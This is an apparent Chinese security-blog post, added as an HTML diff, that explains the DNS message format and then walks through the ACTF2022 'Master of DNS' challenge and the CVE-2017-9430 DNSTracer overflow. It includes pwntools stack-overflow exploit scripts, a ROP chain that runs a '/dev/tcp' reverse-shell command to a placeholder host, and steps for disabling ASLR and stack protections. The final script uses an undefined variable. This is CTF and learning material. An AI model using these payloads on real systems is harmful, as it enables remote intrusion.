@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DNS漏洞初探 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DNS漏洞初探</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-12-24 02:29:19
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                    #IOT安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/" title="协议安全">
+                    #协议安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="DNS漏洞初探"><a href="#DNS漏洞初探" class="headerlink" title="DNS漏洞初探"></a>DNS漏洞初探</h1><h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS请求和响应的基本单位都是DNS报文（Message），并且每个报文由5段Section构成：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212090025996.png"></p>
+<p><strong>DNS Header：</strong>DNS头部区域，每个DNS报文都必须拥有的一部分，长度固定为12个字节</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240231811.png"></p>
+<p>ID：同一个查询或响应对应的16位ID</p>
+<p>QR：查询（0）；响应（1）</p>
+<p>Opcode：标准查询或者反向查询</p>
+<p>TC：UDP长度大于512时截断并使用TCP再次请求</p>
+<p>QDCOUNT：查询数量</p>
+<p>ANCOUNT：响应数量</p>
+<p><strong>Question：</strong>DNS查询区域，存放向服务器查询的域名数据，一般情况下只有一条Entry</p>
+<p>查询区域主要由目标查询域名，查询类型和查询类组成</p>
+<p>格式：length + string</p>
+<p>Entry结构：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212090025941.png"></p>
+<p><strong>Answer：</strong>DNS响应区域，由资源记录的域名，RDATA的类型，RDATA类，TTL值，RDARA长度和RDATA组成</p>
+<p><strong>Authority：</strong>DNS认证区域</p>
+<p><strong>Additional：</strong>DNS附加区域</p>
+<p>后三个区域部分格式一致，每个部分都由若干实体组成，每个实体就是一条RR（资源记录）</p>
+<p><strong>RR（ResourceRecord）资源记录：</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240231652.png"></p>
+<pre class="language-none"><code class="language-none">NAME：指定该条记录对应的域名
+TYPE：资源记录类型
+CLASS：指定请求的类型，对应Question的QCLASS，常用值：IN，值为0x001
+TTL：资源有效期，你可以将该条RR缓存TTL秒，TTL为0表示该RR不能被缓存
+RDLENGTH：两字节非负整数，指定RDATA字节长度
+RDATA：长度和结构都可变得字段，具体结构取决于TYPE字段指定的资源类型</code></pre>
+
+<p>DNS常见资源记录类型：NS记录，A记录，CNAME记录</p>
+<pre class="language-none"><code class="language-none">NS记录：指定某个域的权威DNS
+A记录：域名与IP的对应
+CNAME记录：别名记录，允许奖多个记录映射到同一台计算机上</code></pre>
+
+
+
+<h2 id="ACTF2022-Mater-of-DNS"><a href="#ACTF2022-Mater-of-DNS" class="headerlink" title="ACTF2022 Mater of DNS"></a>ACTF2022 Mater of DNS</h2><h3 id="获取源软件"><a href="#获取源软件" class="headerlink" title="获取源软件"></a>获取源软件</h3><p>首先查看DNS的版本</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240231457.png"></p>
+<p>通过版本号获取软件源码：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;thekelleys.org.uk&#x2F;dnsmasq&#x2F;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240231109.png"></p>
+<p>拥有了源码后，我们将自己进行编译，而编译又受制于<strong>编译器的版本和编译器选项</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240231750.png"></p>
+<p>检查文件保护</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232596.png"></p>
+<p>32位程序，未开启canary和PIE</p>
+<p>修改Makefile中编译选项：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232720.png"></p>
+<p>&#x3D;&#x3D;》修改为：</p>
+<p>需要关闭canary与PIE</p>
+<pre class="language-none"><code class="language-none">-m32:生成32伪代码
+-fno-stack-protector:关闭canary
+-no-pie:关闭PIE
+-O2：编译优化</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232114.png"></p>
+<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><pre class="language-none"><code class="language-none">make</code></pre>
+
+<p>编译完成后的二进制程序将会在软件源码的src路径下：<strong>dnsmasq</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232887.png"></p>
+<h3 id="二进制对比分析"><a href="#二进制对比分析" class="headerlink" title="二进制对比分析"></a>二进制对比分析</h3><p>通过二进制对比软件BinDiff检查不同之处</p>
+<p>在DinDiff中导入两个程序的数据库文件（IDA分析后产生的文件）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232625.png"></p>
+<p>等待分析结果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232643.png"></p>
+<p>发现有一小部分不相同，查看不相同的位置：</p>
+<p>相似度由低到高排序</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232613.png"></p>
+<p>Similarity为1是相同，数值越低表示相似度越低</p>
+<p>经过对所有不相似结果的检查判断，最终锁定于extract_name函数中</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232786.png"></p>
+<p>在Master of DNS中的sub_0804F345中多出了memcpy函数</p>
+<h3 id="漏洞确定"><a href="#漏洞确定" class="headerlink" title="漏洞确定"></a>漏洞确定</h3><p>通过IDA静态分析得知，该memcpy函数为往栈上拷贝内容，dest是栈上的一段缓冲区</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232911.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232844.png"></p>
+<p>通过在dnsmasq项目中搜索extract_name函数：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-rn</span> <span class="token string">"extract_name"</span> *</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240232496.png"></p>
+<p>进入src&#x2F;rfc1035.c文件中查看函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233094.png"></p>
+<p>得知memcpy函数的src参数为extract_name函数的name参数</p>
+<p>对sub_804F345函数进行分析：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233732.png"></p>
+<p>最大长度为0x400</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233355.png"></p>
+<p>域名通过’.’分割，后面是一个将大写字符转换成小写字符</p>
+<h4 id="GDB动态调试"><a href="#GDB动态调试" class="headerlink" title="GDB动态调试"></a>GDB动态调试</h4><p>使用动态调试确定函数功能是否如自己所想</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#终端1</span>
+<span class="token function">sudo</span> ./start.sh   <span class="token comment">#(1)</span>
+
+<span class="token comment">#终端2</span>
+<span class="token function">sudo</span> <span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span><span class="token function">grep</span> dns <span class="token comment">#获得对应PID (2)</span>
+
+<span class="token function">dig</span> @127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">9999</span> baidu.com <span class="token comment">#执行正常的DNS查询  (6)</span>
+
+<span class="token comment">#终端3</span>
+gdb <span class="token parameter variable">--pid</span> <span class="token punctuation">[</span>PID<span class="token punctuation">]</span>  <span class="token comment">#(3)</span>
+
+b * 0x804F444  <span class="token comment">#下断点于memcpy函数处 (4)</span>
+c    <span class="token comment">#(5)</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233155.png"></p>
+<p>正如静态分析一样，src中为要查询的域名；</p>
+<p>由于比dnsmasq添加了memcpy函数，猜测为栈溢出相关漏洞&#x3D;&#x3D;》</p>
+<p>尝试查询超长域名：没有出现程序崩溃，但是出现了两种报错</p>
+<p>1、域名长度超过255个字符</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233878.png"></p>
+<p>2、域名每个段标签长度超过63个字符，也就是两个”.”之间的字符串</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233596.png"></p>
+<h4 id="流量调试"><a href="#流量调试" class="headerlink" title="流量调试"></a>流量调试</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">dig</span> @127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">9999</span> baidu.com</code></pre>
+
+<h5 id="wireshark流量捕获"><a href="#wireshark流量捕获" class="headerlink" title="wireshark流量捕获"></a>wireshark流量捕获</h5><p>启动wireshark，监听网卡（我使用的ubuntu虚拟机使用的是桥接模式，所以我会选择WLAN网卡）</p>
+<p>过滤DNS流量：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233503.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233733.png"></p>
+<p>由数据包可知，构造数据包的数据有：</p>
+<p>头：随意的Transaction ID + 01 20 00 01 00 00 00 00 00 01</p>
+<p>尾：00 01 00 01</p>
+<h3 id="尝试溢出"><a href="#尝试溢出" class="headerlink" title="尝试溢出"></a>尝试溢出</h3><p>域名需要控制每个label（段标签）为63字节（0x3f）</p>
+<p>需要1字节的label length</p>
+<p>&#x3D;&#x3D;》每个label需要0x40</p>
+<p>name总长度不能大于0x400</p>
+<p>&#x3D;&#x3D;》总共可以构造16个label</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233845.png"></p>
+<p>查看IDA中dest距离栈底一共0x381字节</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">,</span>typ<span class="token operator">=</span><span class="token string">'udp'</span><span class="token punctuation">)</span>
+head <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"000001200001000000000001"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'\x3f'</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x3f</span>
+payload <span class="token operator">=</span> payload <span class="token operator">*</span> <span class="token number">14</span> <span class="token operator">+</span> <span class="token string">b'\x04'</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> <span class="token string">b'\x04'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token string">b'\x00'</span>
+end <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"00010001"</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>head <span class="token operator">+</span> payload <span class="token operator">+</span> end<span class="token punctuation">)</span></code></pre>
+
+<p>通过gdb调试：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233510.png"></p>
+<p>成功触发栈溢出，并且劫持返回地址</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由师傅们的文章知晓udp协议中不能直接执行system(‘&#x2F;bin&#x2F;sh’)；</p>
+<p>所以考虑将shell反弹至vps上（或wegt，nc等）；</p>
+<p>程序中并无system函数；</p>
+<p>但是有popen函数，popen函数会将第一个参数放到新fork的进程中执行并抓取返回结果&#x3D;&#x3D;》命令执行</p>
+<p>第二个参数为字符串，固定为”r”,”w”等，表示读写</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string">"touch /tmp/x"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+
+
+<p>接下来就是缺一个可以执行的命令，为了反弹shell至vps&#x3D;&#x3D;》</p>
+<p>需要将要执行的命令写到bss段上&#x3D;&#x3D;》</p>
+<p>在程序中有这么这么一段链，只要能控制eax寄存器就能实现任意地址写</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233906.png"></p>
+<p>所以还需要一个控制eax的gadget：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233727.png"></p>
+<p>并且，发送的域名中还不能有\x00和\x2e&#x3D;&#x3D;》需要添加一个地址最后为\x2e的无用gadget</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240233666.png"></p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">,</span>typ<span class="token operator">=</span><span class="token string">'udp'</span><span class="token punctuation">)</span>
+
+head <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"000001200001000000000001"</span><span class="token punctuation">)</span>
+end <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"00010001"</span><span class="token punctuation">)</span>
+
+magic <span class="token operator">=</span> <span class="token number">0x804b2b1</span>
+eax_ret <span class="token operator">=</span> <span class="token number">0x08059d44</span>
+bss<span class="token operator">=</span><span class="token number">0x80a7070</span>
+popen_addr <span class="token operator">=</span> <span class="token number">0x804ab40</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0x804ad30</span>
+w_addr<span class="token operator">=</span><span class="token number">0x080A6660</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'\x3f'</span><span class="token operator">+</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x3f</span>
+payload <span class="token operator">=</span> payload <span class="token operator">*</span> <span class="token number">14</span> <span class="token operator">+</span> <span class="token string">b'\x04'</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>eax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token comment">#控制eax寄存器的值为bss_addr</span>
+
+cmdarray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+cmd <span class="token operator">=</span> <span class="token string">b'/bin/sh -i >&amp; /dev/tcp/xx.xx.xx.xx/x 0>&amp;1'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>  <span class="token comment">#44</span>
+
+<span class="token comment">#将命令分为若干4字节</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cmdarray<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>cmd<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#将执行命令写至bss段    </span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">+=</span> <span class="token string">b'\x3f'</span>
+payload <span class="token operator">+=</span> <span class="token string">b'\xa9\x04\x08'</span>  <span class="token comment">#nop_ret</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span>
+
+<span class="token comment">#最后执行popen("命令","w")    </span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>popen_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>w_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'aaaa\x00'</span>
+
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>head <span class="token operator">+</span> payload <span class="token operator">+</span> end<span class="token punctuation">)</span></code></pre>
+
+
+
+
+
+
+
+<h3 id="DNS服务漏洞搜集及简述"><a href="#DNS服务漏洞搜集及简述" class="headerlink" title="DNS服务漏洞搜集及简述"></a>DNS服务漏洞搜集及简述</h3><h4 id="CVE-2017-9430"><a href="#CVE-2017-9430" class="headerlink" title="CVE-2017-9430"></a>CVE-2017-9430</h4><p>DNSTracer 1.9缓冲区溢出</p>
+<p>相关链接：</p>
+<pre class="language-URL" data-language="URL"><code class="language-URL">https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2017-9430
+
+#exp：
+https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;42424</code></pre>
+
+<p>描述：DNSTracer是用来跟踪DNS解析过程的应用程序；DNSTracer 1.9及之前的版本中存在栈缓冲区溢出漏洞；</p>
+<p>攻击者可借助带有较长参数的命令行利用该漏洞造成拒绝服务攻击，出现原因为较长参数argv[0]与strcpy函数的处理不当造成。</p>
+<p>编译安装DNSTracer</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://www.mavetju.org/download/dnstracer-1.9.tar.gz
+<span class="token function">tar</span> zxvf dnstracer-1.9.tar.gz
+<span class="token builtin class-name">cd</span> dnstracer-1.9
+./configure
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span>
+
+<span class="token comment">#检验是否安装完成</span>
+dnstracer <span class="token parameter variable">-v</span></code></pre>
+
+
+
+<p>确定漏洞点：dnstracer.c</p>
+<p>main：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234464.png"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234546.png"></p>
+<p>argv大小为：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234199.png"></p>
+<p>漏洞分析：</p>
+<p>使用strcpy函数将argv[0]复制到数组argv0，并没有做检查，导致当argv[0]大于1024字节时将触发栈溢出</p>
+<p>触发栈溢出漏洞：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">dnstracer <span class="token parameter variable">-v</span> <span class="token variable"><span class="token variable">$(</span>python <span class="token parameter variable">-c</span> <span class="token string">'print b"A"*1025'</span><span class="token variable">)</span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234377.png"></p>
+<p>由于在未改变编译选项，所以现在的程序将会是保护全开的</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234009.png"></p>
+<p>为此，与上文中DNSmasq编译类似，关闭canary与PIE</p>
+<p>Makefile：</p>
+<pre class="language-makefile" data-language="makefile"><code class="language-makefile">CC <span class="token operator">=</span> gcc -fno-stack-protector -no-pie -z execstack -D_FORTIFY_SOURCE<span class="token operator">=</span>0</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234914.png"></p>
+<p>再次编译即可：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234952.png"></p>
+<p>然后在root权限下关闭ASLR即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span>
+<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space</code></pre>
+
+
+
+<p>动态调试溢出长度：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gdb dnstracer
+
+cyclic <span class="token number">1200</span>
+<span class="token comment">#设置参数</span>
+<span class="token builtin class-name">set</span> args <span class="token punctuation">[</span>垃圾数据<span class="token punctuation">]</span>
+r</code></pre>
+
+<p>在调试途中还学习到可以直接使用pwntools设置argv</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+io<span class="token operator">=</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'程序名'</span><span class="token punctuation">,</span><span class="token string">'自定义数据'</span>……<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
+
+<p>将成功覆盖返回地址：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234536.png"></p>
+<p>&#x3D;&#x3D;》得出溢出长度为1096</p>
+<p>gdb验证：</p>
+<pre class="language-gdb" data-language="gdb"><code class="language-gdb">set args aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb
+
+r</code></pre>
+
+<p>成功劫持返回地址：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234999.png"></p>
+<p>并且在测试途中还发现了一个有趣的东西</p>
+<p>当我选择只传入1096字节的数据时：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202212240234988.png"></p>
+<p>并且rbx数据的内容是可控的&#x3D;&#x3D;》经过计算得知1048字节后即为rbx数据，再之后就是r12~r15的数据</p>
